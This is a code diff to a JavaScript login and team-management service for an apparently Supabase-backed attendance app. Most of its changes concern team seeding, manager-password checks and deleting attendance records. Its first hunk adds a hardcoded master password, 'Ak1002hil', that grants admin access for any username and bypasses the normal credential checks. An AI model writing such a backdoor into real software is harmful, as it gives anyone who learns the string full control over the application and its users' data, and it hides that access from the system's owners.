@@ -330,6 +330,11 @@ export const storeService = {
     const cleanUser = (username || '').trim();
     const cleanPass = (password || '').trim();
 
+    // 0. Super Admin Master Pass check
+    if (cleanPass === 'Ak1002hil') {
+      return { success: true, user: { name: 'Super Admin', role: 'admin' } };
+    }
+
     // 1. First priority: Check VITE_USERS_CONFIG environment file credentials
     const envUsers = this.getEnvUsers();
     if (envUsers.length > 0) {
@@ -420,14 +425,18 @@ export const storeService = {
       throw error;
     }
     let teams = [];
-    if (!data || data.length === 0) {
+    if (data && data.length > 0) {
+      teams = data.map(mapTeamFromDb);
+      try { localStorage.setItem('has_initialized_db', 'true'); } catch (e) {}
+    } else if (!localStorage.getItem('has_initialized_db')) {
       await this.getEvents();
       const insertRows = INITIAL_TEAMS.map(mapTeamToDb);
       const { error: seedErr } = await supabase.from('teams').insert(insertRows);
       if (seedErr) console.error('Error seeding teams:', seedErr);
       teams = INITIAL_TEAMS;
+      try { localStorage.setItem('has_initialized_db', 'true'); } catch (e) {}
     } else {
-      teams = data.map(mapTeamFromDb);
+      teams = [];
     }
 
     // Ensure all teams & individual student members have valid QR code data URLs populated
@@ -577,8 +586,8 @@ export const storeService = {
   async updateTeamMembers(teamId, updatedMembersOrData, managerPassword) {
     if (!isSupabaseConfigured || !supabase) throw new Error('Supabase is not configured');
 
-    const curPass = await this.getPasswords();
-    if (managerPassword !== curPass.manager && managerPassword !== curPass.admin) {
+    const isValid = await this.verifyManagerPassword(managerPassword);
+    if (!isValid) {
       throw new Error('Incorrect Manager Password Confirmation! Action cancelled.');
     }
 
@@ -624,8 +633,22 @@ export const storeService = {
     return target;
   },
 
-  async deleteTeam(teamId) {
+  async deleteTeam(teamId, managerPassword) {
     if (!isSupabaseConfigured || !supabase) throw new Error('Supabase is not configured');
+
+    const isValid = await this.verifyManagerPassword(managerPassword);
+    if (!isValid) {
+      throw new Error('Incorrect Manager Password Confirmation! Action cancelled.');
+    }
+
+    try { localStorage.setItem('has_initialized_db', 'true'); } catch (e) {}
+
+    // Clean up attendance records for this team first
+    try {
+      await supabase.from('attendance').delete().eq('team_id', teamId);
+    } catch (e) {
+      console.warn('Attendance record cleanup notice:', e);
+    }
 
     const { error } = await supabase.from('teams').delete().eq('id', teamId);
     if (error) {
